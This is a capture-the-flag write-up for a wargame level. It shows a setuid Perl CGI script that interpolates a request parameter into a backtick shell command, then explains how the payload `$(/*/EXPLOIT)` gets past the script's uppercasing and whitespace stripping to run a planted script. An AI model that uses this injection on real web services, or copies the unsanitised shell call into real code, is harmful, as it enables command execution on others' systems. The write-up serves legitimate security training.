# Level12 Writeup
 
## Info
 
User level12 has a setuid (flag12) perl `level12.pl` in the root of their home directory.
 
`level12.pl`
``` perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";
 
sub t {
 $nn = $_[1];
 $xx = $_[0];
 $xx =~ tr/a-z/A-Z/;
 $xx =~ s/\s.*//;
 @output = `egrep "^$xx" /tmp/xd 2>&1`;
 foreach $line (@output) {
     ($f, $s) = split(/:/, $line);
     if($s =~ $nn) {
         return 1;
     }
 }
 return 0;
}
 
sub n {
 if($_[0] == 1) {
     print("..");
 } else {
     print(".");
 }   
}
 
n(t(param("x"), param("y")));
```
 
Using nmap we can confirm that there is indeed a port open on 4646. However this isn't as easy as in level04, there are 2 caveats in executing shell scripts. `$xx =~ tr/a-z/A-Z/;` capitalizes our input and `$xx =~ s/\s.*//;` removes all content after a single whitespace. Meaning we need to create an exploit that has no whitespace and works with only capital letters.
 
## Victory
 
We can simply create a script with full capital letters like `EXPLOIT` and place it in a folder where all users have access, like /tmp.
 
`EXPLOIT`
``` bash
getflag > /tmp/flag
```
 
Then we navigate to the web server via a browser and simply pass `$(/*/EXPLOIT)` to param x. Where the number of /* is equal to the number of folders in the path to our program.
 
Simply cat the file created and voila, the flag.